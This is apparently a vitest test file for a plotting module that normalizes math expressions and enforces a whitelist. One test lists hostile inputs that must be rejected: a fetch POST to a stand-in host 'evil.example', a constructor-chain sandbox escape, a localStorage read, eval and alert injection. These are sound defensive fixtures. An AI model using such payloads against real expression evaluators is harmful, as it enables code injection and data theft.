import { describe, expect, it } from 'vitest';
import { diagnosePlotExpression, isSafeMathExpression, normalizePlotExpression } from './plot';

describe('plot diagnostics', () => {
  it('normalizes gaussian aliases into supported expressions', () => {
    expect(normalizePlotExpression('normal_pdf(x,0,1)')).toContain('exp');
    expect(normalizePlotExpression('gaussian(x,0,2)')).toContain('exp');
    expect(normalizePlotExpression('phi(x)')).toContain('exp');
  });

  it('normalizes sigma and mu symbols', () => {
    const expr = normalizePlotExpression(
      '1/(σ*sqrt(2*pi))*exp(-((x-μ)^2)/(2*σ^2))',
      { mu: 0, sigma: 1 },
    );

    expect(expr).toContain('sqrt');
    expect(expr).not.toContain('σ');
    expect(expr).not.toContain('μ');
  });

  it('reports invalid expression instead of returning an empty curve silently', () => {
    const result = diagnosePlotExpression('\\frac{1}{x}', { xmin: -1, xmax: 1 });

    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.reason).toBe('unsupported-syntax');
  });

  it('rejects expressions that would escape the math whitelist', () => {
    const hostile = [
      'fetch("https://evil.example", {method:"POST"})',
      'x.constructor.constructor("return this")()',
      'globalThis.localStorage.getItem("k")',
      '(()=>{while(1){}})()',
      'x,alert(1)',
      'eval("x")',
      '["a"].map(x)',
      'x ? `t${x}` : 0',
    ];
    for (const expr of hostile) {
      const result = diagnosePlotExpression(expr);
      expect(result.ok, expr).toBe(false);
      expect(normalizePlotExpression(expr)).toBe('');
    }
  });

  it('keeps legitimate math expressions working', () => {
    for (const expr of [
      'sin(x)/x',
      '2x^2+3*x-1',
      'normal_pdf(x,0,1)',
      'exp(-(x^2))',
      'min(max(x,0),1)',
      'pi*e*x',
      'x>0?x:-x',
      'x<2&&x>-2?x:0',
    ]) {
      const result = diagnosePlotExpression(expr);
      expect(result.ok, expr).toBe(true);
    }
  });

  it('isSafeMathExpression accepts whitelist identifiers and rejects the rest', () => {
    expect(isSafeMathExpression('sin(x)*exp(-x)')).toBe(true);
    expect(isSafeMathExpression('this.x')).toBe(false);
    expect(isSafeMathExpression('process.env')).toBe(false);
  });
});
